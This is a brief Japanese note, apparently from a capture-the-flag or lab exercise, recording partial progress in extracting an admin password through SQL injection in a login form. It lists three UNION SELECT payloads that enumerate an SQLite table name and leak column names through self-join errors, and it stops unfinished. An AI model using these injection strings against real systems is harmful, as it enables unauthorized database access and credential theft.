adminユーザのパスワード：
パスワードを取得した手順：
Usernameに以下を入力し、captchaを入力
' UNION SELECT name FROM sqlite_sequence;--

テーブル名は、ourcustomertable

Usernameに以下を入力し、captchaを入力
' UNION SELECT * FROM ourcustomertable JOIN ourcustomertable;

一つ目のカラム名は、id

Usernameに以下を入力し、captchaを入力
' UNION SELECT * FROM ourcustomertable JOIN ourcustomertable USING(id);

ユーザ名のカラム名は、username___Aeyo6fah4iep_

ここから先に進めず。